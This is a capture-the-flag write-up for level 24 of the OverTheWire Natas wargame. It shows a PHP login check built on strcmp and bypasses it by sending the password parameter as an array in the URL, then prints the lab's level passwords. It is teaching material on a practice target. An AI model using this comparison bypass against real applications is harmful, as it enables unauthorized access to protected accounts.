# Natas Level 24
```bash
Username: natas24
Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
URL:      http://natas24.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas24.png" />
    <div align="center">Natas 24</div>
</figure>

And the [source code](http://natas24.natas.labs.overthewire.org/index-source.html):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas24-view-sourcecode.png" />
    <div align="center">Natas 24 - View sourcecode</div>
</figure>

The script is:
```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

In first look, we need to guess the secret password.

Searching for vulnerabilities in *strcmp* we found "[Array Injection](https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html)"

We just need to send array as the GET parameter.

[Sending](http://natas24.natas.labs.overthewire.org/?passwd[]=1&amp;passwd[]=2):
```bash
http://natas24.natas.labs.overthewire.org/?passwd[]=1&passwd[]=2
```

We get:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas24-pwned.png" />
    <div align="center">Natas 24 - PWNed</div>
</figure>

We got the password for the next level: **GHF6X7YwACaYYssHVY05cFq83hRktl4c**